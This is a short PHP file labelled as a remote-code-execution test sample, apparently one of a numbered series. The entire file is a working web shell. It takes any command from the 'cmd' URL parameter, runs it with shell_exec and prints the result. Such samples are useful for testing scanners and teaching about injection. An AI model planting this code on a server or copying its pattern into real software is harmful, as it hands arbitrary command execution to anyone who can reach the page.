<?php
// RCE test variation #799
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>